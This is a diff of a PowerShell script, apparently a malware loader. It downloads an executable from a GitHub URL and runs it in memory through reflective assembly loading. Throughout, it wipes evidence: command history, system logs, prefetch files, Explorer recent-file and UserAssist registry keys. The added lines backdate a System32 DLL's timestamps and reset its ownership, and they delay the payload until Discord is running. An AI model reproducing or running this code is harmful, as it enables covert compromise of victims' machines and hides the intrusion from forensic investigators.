@@ -1,10 +1,8 @@
 $link = "https://github.com/zold1337/toolsvip/raw/refs/heads/main/IME.exe"
 $webClient = New-Object System.Net.WebClient
 $bytes = $webClient.DownloadData($link)
-
 $assembly = [System.Reflection.Assembly]::Load($bytes)
 $entry = $assembly.EntryPoint
-
 
 Stop-Process -Name "runonce" -Force
 Stop-Process -Name "runonce.exe" -Force
@@ -13,6 +11,17 @@ Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOn
 Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 Clear-History -ErrorAction SilentlyContinue
 fsutil behavior set disablelastaccess 1
+$XXXXXX="$env:windir\System32\BluetoothDesktopHandlers.dll"
+icacls $XXXXXX /inheritance:e
+icacls $XXXXXX /reset
+icacls $XXXXXX /setowner "NT SERVICE\TrustedInstaller"
+Set-ItemProperty "$env:windir\System32\BluetoothDesktopHandlers.dll" -Name IsReadOnly -Value $true -ErrorAction SilentlyContinue > $null 2>&1
+
+$f = "C:\Windows\System32\BluetoothDesktopHandlers.dll"
+$d = (Get-CimInstance Win32_OperatingSystem).InstallDate
+(Get-Item $f).CreationTime = $d
+(Get-Item $f).LastWriteTime = $d
+(Get-Item $f).LastAccessTime = $d
 Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Logs\CBS\*.log"
 Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\CrashDumps\*.dmp"
 Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Logs\MoSetup\*.log"
@@ -61,8 +70,35 @@ Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Rece
 Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\CIDSizeMRU" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count" -Recurse -Force -ErrorAction SilentlyContinue
 
+Remove-Item -Path "C:\Windows\Prefetch\POWERSHELL*" -Force -ErrorAction SilentlyContinue
+Remove-Item -Path "C:\Windows\Prefetch\RUNONCE*" -Force -ErrorAction SilentlyContinue
 Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 Clear-History -ErrorAction SilentlyContinue
+
+$timeout = (Get-Date).AddSeconds(60)
+
+while ((Get-Date) -lt $timeout) {
+    if (Get-Process Discord -ErrorAction SilentlyContinue) {
+        break
+    }
+    Start-Sleep 1
+}
+
+if (-not (Get-Process Discord -ErrorAction SilentlyContinue)) {
+    {
+Remove-Item -Path "C:\Windows\Prefetch\POWERSHELL*" -Force -ErrorAction SilentlyContinue
+Remove-Item -Path "C:\Windows\Prefetch\RUNONCE*" -Force -ErrorAction SilentlyContinue
+Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+Clear-History -ErrorAction SilentlyContinue
+Exit
+    }.Invoke()
+}
+
+
+$invokeArgs = New-Object object[] 1
+$invokeArgs[0] = [string[]]@()
+
+$entry.Invoke($null, $invokeArgs)
 
 
 $services = @(
@@ -81,16 +117,8 @@ foreach ($svc in $services) {
     Set-Service -Name $svc -StartupType Automatic -ErrorAction SilentlyContinue
     Start-Service -Name $svc -ErrorAction SilentlyContinue
 }
-
 Remove-Item -Path "C:\Windows\Prefetch\POWERSHELL*" -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "C:\Windows\Prefetch\RUNONCE*" -Force -ErrorAction SilentlyContinue
 Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 Clear-History -ErrorAction SilentlyContinue
-Start-Sleep -Seconds 15
-
-$invokeArgs = New-Object object[] 1
-$invokeArgs[0] = [string[]]@()
-
-$entry.Invoke($null, $invokeArgs)
-
 Exit
